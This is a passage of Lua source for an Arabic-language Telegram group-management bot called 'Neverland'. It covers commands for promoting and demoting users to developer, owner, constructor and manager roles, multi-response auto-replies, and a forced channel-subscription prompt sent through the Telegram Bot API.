if #list == 0 then
t = "✦┇لا يوجد محظورين"
return send(msg.chat_id_, msg.id_, t)
end
return SendMsg_Msgeeslist("listban",msg.chat_id_,msg.sender_user_id_,msg.id_, t)
end 

if text == ("اضف مطور") and tonumber(msg.reply_to_message_id_) ~= 0 and DevNeverland(msg) then
function Function_Neverland(extra, result, success)
database:sadd(bot_id.."Neverland:Sudo:User", result.sender_user_id_)
Reply_Status(msg,result.sender_user_id_,"reply","✦┇تم رفعه مطور")  
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, Function_Neverland, nil)
return false 
end
if text and text:match("^اضف مطور @(.*)$") and DevNeverland(msg) then
local username = text:match("^اضف مطور @(.*)$")
function Function_Neverland(extra, result, success)
if result.id_ then
if (result and result.type_ and result.type_.ID == "ChannelChatInfo") then
send(msg.chat_id_,msg.id_,"✦┇عذرا عزيزي المستخدم هاذا معرف قناة يرجى استخدام الامر بصوره صحيحه !")   
return false 
end      
database:sadd(bot_id.."Neverland:Sudo:User", result.id_)
Reply_Status(msg,result.id_,"reply","✦┇تم رفعه مطور")  
else
send(msg.chat_id_, msg.id_,"✦┇لا يوجد حساب بهاذا المعرف")
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, Function_Neverland, nil)
return false 
end
if text and text:match("^اضف مطور (%d+)$") and DevNeverland(msg) then
local userid = text:match("^اضف مطور (%d+)$")
database:sadd(bot_id.."Neverland:Sudo:User", userid)
Reply_Status(msg,userid,"reply","✦┇تم رفعه مطور")  
return false 
end
if text == ("حذف مطور") and tonumber(msg.reply_to_message_id_) ~= 0 and DevNeverland(msg) then
function Function_Neverland(extra, result, success)
database:srem(bot_id.."Neverland:Sudo:User", result.sender_user_id_)
Reply_Status(msg,result.sender_user_id_,"reply","✦┇تم تنزيله من المطورين")  
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, Function_Neverland, nil)
return false 
end
if text and text:match("^حذف مطور @(.*)$") and DevNeverland(msg) then
local username = text:match("^حذف مطور @(.*)$")
function Function_Neverland(extra, result, success)
if result.id_ then
database:srem(bot_id.."Neverland:Sudo:User", result.id_)
Reply_Status(msg,result.id_,"reply","✦┇تم تنزيله من المطورين")  
else
send(msg.chat_id_, msg.id_,"✦┇لا يوجد حساب بهاذا المعرف")
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, Function_Neverland, nil)
return false
end  
if text and text:match("^حذف مطور (%d+)$") and DevNeverland(msg) then
local userid = text:match("^حذف مطور (%d+)$")
database:srem(bot_id.."Neverland:Sudo:User", userid)
Reply_Status(msg,userid,"reply","✦┇تم تنزيله من المطورين")  
return false 
end

if text and text:match("^(.*)$") then
if database:get(bot_id.."botss:Neverland:Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_) == "true" then
send(msg.chat_id_, msg.id_, '\nارسل لي الكلمه الان ')
database:set(bot_id.."botss:Neverland:Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_, "true1")
database:set(bot_id.."botss:Neverland:Text:Sudo:Bot"..msg.sender_user_id_..":"..msg.chat_id_, text)
database:sadd(bot_id.."botss:Neverland:List:Rd:Sudo", text)
return false end
end
if text and text:match("^(.*)$") then
if database:get(bot_id.."botss:Neverland:Set:On"..msg.sender_user_id_..":"..msg.chat_id_) == "true" then
send(msg.chat_id_, msg.id_,"تم حذف الرد من ردود المتعدده")
database:del(bot_id..'botss:Neverland:Add:Rd:Sudo:Text'..text)
database:del(bot_id..'botss:Neverland:Add:Rd:Sudo:Text1'..text)
database:del(bot_id..'botss:Neverland:Add:Rd:Sudo:Text2'..text)
database:del(bot_id.."botss:Neverland:Set:On"..msg.sender_user_id_..":"..msg.chat_id_)
database:srem(bot_id.."botss:Neverland:List:Rd:Sudo", text)
return false
end
end
if text == ("مسح الردود المتعدده") and creatorA(msg) then
 
local list = database:smembers(bot_id.."botss:Neverland:List:Rd:Sudo")
for k,v in pairs(list) do  
database:del(bot_id.."botss:Neverland:Add:Rd:Sudo:Text"..v) 
database:del(bot_id.."botss:Neverland:Add:Rd:Sudo:Text1"..v) 
database:del(bot_id.."botss:Neverland:Add:Rd:Sudo:Text2"..v)   
database:del(bot_id.."botss:Neverland:List:Rd:Sudo")
end
send(msg.chat_id_, msg.id_,"تم حذف ردود المتعدده")
end
if text == ("الردود المتعدده") and creatorA(msg) then
 
local list = database:smembers(bot_id.."botss:Neverland:List:Rd:Sudo")
text = "\nقائمة ردود المتعدده \n━━━━━━━━\n"
for k,v in pairs(list) do
db = "رساله "
text = text..""..k.." => {"..v.."} => {"..db.."}\n"
end
if #list == 0 then
text = "لا توجد ردود متعدده"
end
send(msg.chat_id_, msg.id_,"["..text.."]")
end
if text == "اضف رد متعدد" and creatorA(msg) then
 
database:set(bot_id.."botss:Neverland:Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_,true)
return send(msg.chat_id_, msg.id_,"ارسل الرد الذي اريد اضافته")
end
if text == "حذف رد متعدد" and creatorA(msg) then
 
database:set(bot_id.."botss:Neverland:Set:On"..msg.sender_user_id_..":"..msg.chat_id_,true)
return send(msg.chat_id_, msg.id_,"ارسل الان الكلمه لحذفها ")
end
if text then  
local test = database:get(bot_id.."botss:Neverland:Text:Sudo:Bot"..msg.sender_user_id_..":"..msg.chat_id_)
if database:get(bot_id.."botss:Neverland:Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_) == "true1" then
database:set(bot_id.."botss:Neverland:Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_,'rd1')
if text then   
text = text:gsub('"',"") 
text = text:gsub('"',"") 
text = text:gsub("`","") 
text = text:gsub("*","") 
database:set(bot_id.."botss:Neverland:Add:Rd:Sudo:Text"..test, text)  
end  
send(msg.chat_id_, msg.id_,"تم حفظ الرد الاول ارسل الرد الثاني")
return false  
end  
end
if text then  
local test = database:get(bot_id.."botss:Neverland:Text:Sudo:Bot"..msg.sender_user_id_..":"..msg.chat_id_)
if database:get(bot_id.."botss:Neverland:Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_) == "rd1" then
database:set(bot_id.."botss:Neverland:Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_,'rd2')
if text then   
text = text:gsub('"',"") 
text = text:gsub('"',"") 
text = text:gsub("`","") 
text = text:gsub("*","") 
database:set(bot_id.."botss:Neverland:Add:Rd:Sudo:Text1"..test, text)  
end  
send(msg.chat_id_, msg.id_,"تم حفظ الرد الثاني ارسل الرد الثالث")
return false  
end  
end
if text then  
local test = database:get(bot_id.."botss:Neverland:Text:Sudo:Bot"..msg.sender_user_id_..":"..msg.chat_id_)
if database:get(bot_id.."botss:Neverland:Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_) == "rd2" then
database:set(bot_id.."botss:Neverland:Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_,'rd3')
if text then   
text = text:gsub('"',"") 
text = text:gsub('"',"") 
text = text:gsub("`","") 
text = text:gsub("*","") 
database:set(bot_id.."botss:Neverland:Add:Rd:Sudo:Text2"..test, text)  
end  
send(msg.chat_id_, msg.id_,"تم حفظ الرد")
return false  
end  
end
if text then
local Text = database:get(bot_id.."botss:Neverland:Add:Rd:Sudo:Text"..text)   
local Text1 = database:get(bot_id.."botss:Neverland:Add:Rd:Sudo:Text1"..text)   
local Text2 = database:get(bot_id.."botss:Neverland:Add:Rd:Sudo:Text2"..text)   
if Text or Text1 or Text2 then 
local texting = {
Text,
Text1,
Text2
}
Textes = math.random(#texting)
send(msg.chat_id_, msg.id_,texting[Textes])
end
end
if text == "المالكين" and creatorA(msg) then
local list = database:smembers(bot_id.."creator"..msg.chat_id_)
t = "\n✦┇قائمة المالكين \n┉ ┉ ┉ ┉ NE ┉ ┉ ┉ ┉\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."Neverland:User:Name" .. v)
if username then
t = t..""..k.."- ([@"..username.."])\n"
else
t = t..""..k.."- (`"..v.."`)\n"
end
end
if #list == 0 then
t = "✦┇لا يوجد مالكين"
return send(msg.chat_id_, msg.id_, t)
end
return SendMsg_Msgeeslist("listcreatorr",msg.chat_id_,msg.sender_user_id_,msg.id_, t)
end
if text == "مسح قائمه المالكين" and creatorA(msg) then
database:del(bot_id.."creator"..msg.chat_id_)
tdcli_function ({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub("-100",""),filter_ = {ID = "ChannelMembersAdministrators"},offset_ = 0,limit_ = 100},function(arg,data) 
local admins = data.members_
for i=0 , #admins do
if data.members_[i].status_.ID == "ChatMemberStatusCreator" then
database:sadd(bot_id.."creator"..msg.chat_id_,admins[i].user_id_)
end 
end  
end,nil)
send(msg.chat_id_, msg.id_, "*✦┇تم مسح المالكين*")
end
if text == ("رفع مالك") and tonumber(msg.reply_to_message_id_) ~= 0 and DevNeverland(msg) then  
function Function_Neverland(extra, result, success)
database:sadd(bot_id.."creator"..msg.chat_id_, result.sender_user_id_)
Reply_Status(msg,result.sender_user_id_,"reply","*✦┇تم رفعه مالك*")  
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, Function_Neverland, nil)
return false
end
if text and text:match("^رفع مالك @(.*)$") and DevNeverland(msg) then  
local username = text:match("^رفع مالك @(.*)$")
function Function_Neverland(extra, result, success)
if result.id_ then
if (result and result.type_ and result.type_.ID == "ChannelChatInfo") then
send(msg.chat_id_,msg.id_,"✦┇عذرا عزيزي المستخدم هاذا معرف قناة يرجى استخدام الامر بصوره صحيحه !")   
return false 
end      
database:sadd(bot_id.."creator"..msg.chat_id_, result.id_)
Reply_Status(msg,result.id_,"reply","*✦┇تم رفعه مالك*")  
else
send(msg.chat_id_, msg.id_,"*✦┇لا يوجد حساب بهاذا المعرف*")
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, Function_Neverland, nil)
return false
end
if text and text:match("^رفع مالك (%d+)$") and DevNeverland(msg) then  
local userid = text:match("^رفع مالك (%d+)$") 
database:sadd(bot_id.."creator"..msg.chat_id_, userid)
Reply_Status(msg,userid,"reply","*✦┇تم رفعه مالك*")  
return false
end
if text == ("تنزيل مالك") and tonumber(msg.reply_to_message_id_) ~= 0 and creatorA(msg) then  
function Function_Neverland(extra, result, success)
database:srem(bot_id.."creator"..msg.chat_id_, result.sender_user_id_)
Reply_Status(msg,result.sender_user_id_,"reply","*✦┇تم تنزيله من المالكين*")  
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, Function_Neverland, nil)
return false
end
if text and text:match("^تنزيل مالك @(.*)$") and DevNeverland(msg) then  
local username = text:match("^تنزيل مالك @(.*)$")
function Function_Neverland(extra, result, success)
if result.id_ then
database:srem(bot_id.."creator"..msg.chat_id_, result.id_)
Reply_Status(msg,result.id_,"reply","✦┇تم تنزيله من المالكين")  
else
send(msg.chat_id_, msg.id_,"*✦┇لا يوجد حساب بهاذا المعرف*")
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, Function_Neverland, nil)
return false
end
if text and text:match("^تنزيل مالك (%d+)$") and DevNeverland(msg) then  
local userid = text:match("^تنزيل مالك (%d+)$") 
database:srem(bot_id.."creator"..msg.chat_id_, userid)
Reply_Status(msg,userid,"reply","*✦┇تم تنزيله من المالكين*")  
return false
end
if text == ("رفع منشئ اساسي") and tonumber(msg.reply_to_message_id_) ~= 0 and creatorA(msg) then  
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
local titlech = (database:get(bot_id..'add:ch:title') or 'آشـترگ بآلقنآ‌‏هہ ')
local keyboard = {}
keyboard.inline_keyboard = {{
{text = URL.escape(titlech),url='https://telegram.me/'..database:get(bot_id..'add:ch:username'):gsub("@","")}}}   
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape('*✦┇عذࢪا عليڪ الاشتࢪاڪ في قناه البوت*').."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end

return false
end
function Function_Neverland(extra, result, success)
database:sadd(bot_id.."Neverland:Basic:Constructor"..msg.chat_id_, result.sender_user_id_)
Reply_Status(msg,result.sender_user_id_,"reply","*✦┇تم رفعه منشئ اساسي*")  
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, Function_Neverland, nil)
return false
end
if text and text:match("^رفع منشئ اساسي @(.*)$") and creatorA(msg) then  
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
local titlech = (database:get(bot_id..'add:ch:title') or 'آشـترگ بآلقنآ‌‏هہ ')
local keyboard = {}
keyboard.inline_keyboard = {{
{text = URL.escape(titlech),url='https://telegram.me/'..database:get(bot_id..'add:ch:username'):gsub("@","")}}}   
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape('*✦┇عذࢪا عليڪ الاشتࢪاڪ في قناه البوت*').."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end

return false
end
local username = text:match("^رفع منشئ اساسي @(.*)$")
function Function_Neverland(extra, result, success)
if result.id_ then
if (result and result.type_ and result.type_.ID == "ChannelChatInfo") then
send(msg.chat_id_,msg.id_,"✦┇عذرا عزيزي المستخدم هاذا معرف قناة يرجى استخدام الامر بصوره صحيحه !")   
return false 
end      
database:sadd(bot_id.."Neverland:Basic:Constructor"..msg.chat_id_, result.id_)
Reply_Status(msg,result.id_,"reply","*✦┇تم رفعه منشئ اساسي*")  
else
send(msg.chat_id_, msg.id_,"✦┇لا يوجد حساب بهاذا المعرف")
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, Function_Neverland, nil)
return false
end
if text and text:match("^رفع منشئ اساسي (%d+)$") and creatorA(msg) then  
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
local titlech = (database:get(bot_id..'add:ch:title') or 'آشـترگ بآلقنآ‌‏هہ ')
local keyboard = {}
keyboard.inline_keyboard = {{
{text = URL.escape(titlech),url='https://telegram.me/'..database:get(bot_id..'add:ch:username'):gsub("@","")}}}   
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape('*✦┇عذࢪا عليڪ الاشتࢪاڪ في قناه البوت*').."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end

return false
end
local userid = text:match("^رفع منشئ اساسي (%d+)$") 
database:sadd(bot_id.."Neverland:Basic:Constructor"..msg.chat_id_, userid)
Reply_Status(msg,userid,"reply","*✦┇تم رفعه منشئ اساسي*")  
return false
end
if text == ("تنزيل منشئ اساسي") and tonumber(msg.reply_to_message_id_) ~= 0 and creatorA(msg) then  
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
local titlech = (database:get(bot_id..'add:ch:title') or 'آشـترگ بآلقنآ‌‏هہ ')
local keyboard = {}
keyboard.inline_keyboard = {{
{text = URL.escape(titlech),url='https://telegram.me/'..database:get(bot_id..'add:ch:username'):gsub("@","")}}}   
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape('*✦┇عذࢪا عليڪ الاشتࢪاڪ في قناه البوت*').."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end

return false
end
function Function_Neverland(extra, result, success)
database:srem(bot_id.."Neverland:Basic:Constructor"..msg.chat_id_, result.sender_user_id_)
Reply_Status(msg,result.sender_user_id_,"reply","✦┇تم تنزيله من المنشئين")  
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, Function_Neverland, nil)
return false
end
if text and text:match("^تنزيل منشئ اساسي @(.*)$") and creatorA(msg) then  
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
local titlech = (database:get(bot_id..'add:ch:title') or 'آشـترگ بآلقنآ‌‏هہ ')
local keyboard = {}
keyboard.inline_keyboard = {{
{text = URL.escape(titlech),url='https://telegram.me/'..database:get(bot_id..'add:ch:username'):gsub("@","")}}}   
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape('*✦┇عذࢪا عليڪ الاشتࢪاڪ في قناه البوت*').."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end

return false
end
local username = text:match("^تنزيل منشئ اساسي @(.*)$")
function Function_Neverland(extra, result, success)
if result.id_ then
database:srem(bot_id.."Neverland:Basic:Constructor"..msg.chat_id_, result.id_)

Reply_Status(msg,result.id_,"reply","✦┇تم تنزيله من المنشئين")  
else
send(msg.chat_id_, msg.id_,"✦┇لا يوجد حساب بهاذا المعرف")
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, Function_Neverland, nil)
return false
end
if text and text:match("^تنزيل منشئ اساسي (%d+)$") and creatorA(msg) then  
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
local titlech = (database:get(bot_id..'add:ch:title') or 'آشـترگ بآلقنآ‌‏هہ ')
local keyboard = {}
keyboard.inline_keyboard = {{
{text = URL.escape(titlech),url='https://telegram.me/'..database:get(bot_id..'add:ch:username'):gsub("@","")}}}   
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape('*✦┇عذࢪا عليڪ الاشتࢪاڪ في قناه البوت*').."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end

return false
end
local userid = text:match("^تنزيل منشئ اساسي (%d+)$") 
database:srem(bot_id.."Neverland:Basic:Constructor"..msg.chat_id_, userid)
Reply_Status(msg,userid,"reply","✦┇تم تنزيله من المنشئين")  
return false
end

if text == "رفع منشئ" and tonumber(msg.reply_to_message_id_) ~= 0 and BasicConstructor(msg) then  
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
local titlech = (database:get(bot_id..'add:ch:title') or 'آشـترگ بآلقنآ‌‏هہ ')
local keyboard = {}
keyboard.inline_keyboard = {{
{text = URL.escape(titlech),url='https://telegram.me/'..database:get(bot_id..'add:ch:username'):gsub("@","")}}}   
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape('*✦┇عذࢪا عليڪ الاشتࢪاڪ في قناه البوت*').."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end

return false
end
function Function_Neverland(extra, result, success)
database:sadd(bot_id.."Neverland:Constructor"..msg.chat_id_, result.sender_user_id_)
Reply_Status(msg,result.sender_user_id_,"reply","*✦┇تم رفعه منشئ*")  
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, Function_Neverland, nil)
end
if text and text:match("^رفع منشئ @(.*)$") and BasicConstructor(msg) then  
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
local titlech = (database:get(bot_id..'add:ch:title') or 'آشـترگ بآلقنآ‌‏هہ ')
local keyboard = {}
keyboard.inline_keyboard = {{
{text = URL.escape(titlech),url='https://telegram.me/'..database:get(bot_id..'add:ch:username'):gsub("@","")}}}   
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape('*✦┇عذࢪا عليڪ الاشتࢪاڪ في قناه البوت*').."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end

return false
end
local username = text:match("^رفع منشئ @(.*)$")
function Function_Neverland(extra, result, success)
if result.id_ then
if (result and result.type_ and result.type_.ID == "ChannelChatInfo") then
send(msg.chat_id_,msg.id_,"✦┇عذرا عزيزي المستخدم هاذا معرف قناة يرجى استخدام الامر بصوره صحيحه !")   
return false 
end      
database:sadd(bot_id.."Neverland:Constructor"..msg.chat_id_, result.id_)
Reply_Status(msg,result.id_,"reply","*✦┇تم رفعه منشئ*")  
else
send(msg.chat_id_, msg.id_,"✦┇لا يوجد حساب بهاذا المعرف")
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, Function_Neverland, nil)
end
------------------------------------------------------------------------
if text and text:match("^رفع منشئ (%d+)$") and BasicConstructor(msg) then  
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
local titlech = (database:get(bot_id..'add:ch:title') or 'آشـترگ بآلقنآ‌‏هہ ')
local keyboard = {}
keyboard.inline_keyboard = {{
{text = URL.escape(titlech),url='https://telegram.me/'..database:get(bot_id..'add:ch:username'):gsub("@","")}}}   
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape('*✦┇عذࢪا عليڪ الاشتࢪاڪ في قناه البوت*').."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end

return false
end
local userid = text:match("^رفع منشئ (%d+)$")
database:sadd(bot_id.."Neverland:Constructor"..msg.chat_id_, userid)
Reply_Status(msg,userid,"reply","*✦┇تم رفعه منشئ*")  
end
if text and text:match("^تنزيل منشئ$") and tonumber(msg.reply_to_message_id_) ~= 0 and BasicConstructor(msg) then
function Function_Neverland(extra, result, success)
database:srem(bot_id.."Neverland:Constructor"..msg.chat_id_, result.sender_user_id_)
Reply_Status(msg,result.sender_user_id_,"reply","✦┇تم تنزيله من المنشئين")  
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, Function_Neverland, nil)
end
------------------------------------------------------------------------
if text and text:match("^تنزيل منشئ @(.*)$") and BasicConstructor(msg) then  
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
local titlech = (database:get(bot_id..'add:ch:title') or 'آشـترگ بآلقنآ‌‏هہ ')
local keyboard = {}
keyboard.inline_keyboard = {{
{text = URL.escape(titlech),url='https://telegram.me/'..database:get(bot_id..'add:ch:username'):gsub("@","")}}}   
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape('*✦┇عذࢪا عليڪ الاشتࢪاڪ في قناه البوت*').."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end

return false
end
local username = text:match("^تنزيل منشئ @(.*)$")
function Function_Neverland(extra, result, success)
if result.id_ then
database:srem(bot_id.."Neverland:Constructor"..msg.chat_id_, result.id_)
Reply_Status(msg,result.id_,"reply","✦┇تم تنزيله من المنشئين")  
else
send(msg.chat_id_, msg.id_,"✦┇لا يوجد حساب بهاذا المعرف")
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, Function_Neverland, nil)
end
------------------------------------------------------------------------
if text and text:match("^تنزيل منشئ (%d+)$") and BasicConstructor(msg) then  
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
local titlech = (database:get(bot_id..'add:ch:title') or 'آشـترگ بآلقنآ‌‏هہ ')
local keyboard = {}
keyboard.inline_keyboard = {{
{text = URL.escape(titlech),url='https://telegram.me/'..database:get(bot_id..'add:ch:username'):gsub("@","")}}}   
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape('*✦┇عذࢪا عليڪ الاشتࢪاڪ في قناه البوت*').."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end

return false
end
local userid = text:match("^تنزيل منشئ (%d+)$")
database:srem(bot_id.."Neverland:Constructor"..msg.chat_id_, userid)
Reply_Status(msg,userid,"reply","✦┇تم تنزيله من المنشئين")  
end

if text == ("رفع مدير") and tonumber(msg.reply_to_message_id_) ~= 0 and Constructor(msg) then  
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
local titlech = (database:get(bot_id..'add:ch:title') or 'آشـترگ بآلقنآ‌‏هہ ')
local keyboard = {}
keyboard.inline_keyboard = {{
{text = URL.escape(titlech),url='https://telegram.me/'..database:get(bot_id..'add:ch:username'):gsub("@","")}}}   
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape('*✦┇عذࢪا عليڪ الاشتࢪاڪ في قناه البوت*').."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end

return false
end
function Function_Neverland(extra, result, success)
database:sadd(bot_id.."Neverland:Manager"..msg.chat_id_, result.sender_user_id_)
Reply_Status(msg,result.sender_user_id_,"reply","*✦┇تم رفعه مدير*")  
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, Function_Neverland, nil)
return false
end  
if text and text:match("^رفع مدير @(.*)$") and Constructor(msg) then  
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
local titlech = (database:get(bot_id..'add:ch:title') or 'آشـترگ بآلقنآ‌‏هہ ')
local keyboard = {}
keyboard.inline_keyboard = {{
{text = URL.escape(titlech),url='https://telegram.me/'..database:get(bot_id..'add:ch:username'):gsub("@","")}}}   
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape('*✦┇عذࢪا عليڪ الاشتࢪاڪ في قناه البوت*').."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end

return false
end
local username = text:match("^رفع مدير @(.*)$") 
function Function_Neverland(extra, result, success)
if result.id_ then
if (result and result.type_ and result.type_.ID == "ChannelChatInfo") then
send(msg.chat_id_,msg.id_,"✦┇عذرا عزيزي المستخدم هاذا معرف قناة يرجى استخدام الامر بصوره صحيحه !")   
return false 
end      
database:sadd(bot_id.."Neverland:Manager"..msg.chat_id_, result.id_)
Reply_Status(msg,result.id_,"reply","*✦┇تم رفعه مدير*")  
else
send(msg.chat_id_, msg.id_,"✦┇لا يوجد حساب بهاذا المعرف")
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, Function_Neverland, nil)
return false
end 

if text and text:match("^رفع مدير (%d+)$") and Constructor(msg) then  
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
local titlech = (database:get(bot_id..'add:ch:title') or 'آشـترگ بآلقنآ‌‏هہ ')
local keyboard = {}
keyboard.inline_keyboard = {{
{text = URL.escape(titlech),url='https://telegram.me/'..database:get(bot_id..'add:ch:username'):gsub("@","")}}}   
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape('*✦┇عذࢪا عليڪ الاشتࢪاڪ في قناه البوت*').."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end

return false
end
local userid = text:match("^رفع مدير (%d+)$") 
database:sadd(bot_id.."Neverland:Manager"..msg.chat_id_, userid)
Reply_Status(msg,userid,"reply","*✦┇تم رفعه مدير*")  
return false
end  
if text == ("تنزيل مدير") and tonumber(msg.reply_to_message_id_) ~= 0 and Constructor(msg) then  
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
